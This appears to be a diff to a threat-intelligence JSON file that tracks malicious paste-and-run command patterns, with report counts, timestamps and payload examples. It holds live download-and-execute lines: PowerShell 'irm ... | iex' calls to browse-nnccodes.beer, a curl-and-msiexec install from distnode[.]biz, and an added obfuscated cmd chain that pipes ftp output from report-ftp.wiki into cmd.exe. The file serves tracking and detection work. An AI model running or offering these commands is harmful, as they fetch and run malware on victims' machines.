@@ -1,12 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 144,
-    "ReportCount": 144,
-    "FirstSeen": "2026-11-10T18:33:07.281000+00:00",
+    "DistinctPayloadCount": 143,
+    "ReportCount": 143,
+    "FirstSeen": "2026-11-10T19:10:48.567000+00:00",
     "LastSeen": "2026-11-17T16:44:32.151000+00:00",
     "ReportIds": [
-      "cmwb12w7t00dj0nmlk3hyfwh0",
       "cmwb2fd2s00g10nmllb1yc2q6",
       "cmwb3aant00gt0nmlmc5pa0pm",
       "cmwb5cxvo00mr0nmly0i3xbks",
@@ -294,8 +293,7 @@
       "irm 'browse-nnccodes.beer/e18d1c790f9d8ed3'|iex;",
       "irm 'browse-nnccodes.beer/eda44de7cd33aa18'|iex;",
       "irm 'browse-nnccodes.beer/f5e3d430790185d2'|iex;",
-      "irm 'browse-nnccodes.beer/fbb6e233d74f5f77'|iex;",
-      "irm 'browse-nnccodes.beer/fd9aaadbb95356a1'|iex;"
+      "irm 'browse-nnccodes.beer/fbb6e233d74f5f77'|iex;"
     ]
   },
   {
@@ -1097,6 +1095,19 @@
     ],
     "PayloadExamples": [
       "cmd /c \"curl -s -o NUL https://xedplay[.]com/verify.php?t=7fe13fa4dc9efc264de91e0508e89fb6 & msiexec /q /i https://distnode[.]biz/radar-cover-probe/named\""
+    ]
+  },
+  {
+    "Pattern": "cmd /c set \"spain=ftp\"&set \"italy=report-ftp.wiki\"&set \"greek=| \"&set \"polan=for /f %m in ('dir /b /s %windir%\\System32\\cm?.e??') do %m\"&start \"\" /min cmd /c \"%spain% %italy% %greek%%polan%\"",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-17T18:50:11.992000+00:00",
+    "LastSeen": "2026-11-17T18:50:11.992000+00:00",
+    "ReportIds": [
+      "cmwl1rtlh1hhu0oml900pzxyy"
+    ],
+    "PayloadExamples": [
+      "cmd /c set \"spain=ftp\"&set \"italy=report-ftp.wiki\"&set \"greek=| \"&set \"polan=for /f %m in ('dir /b /s %windir%\\System32\\cm?.e??') do %m\"&start \"\" /min cmd /c \"%spain% %italy% %greek%%polan%\""
     ]
   },
   {
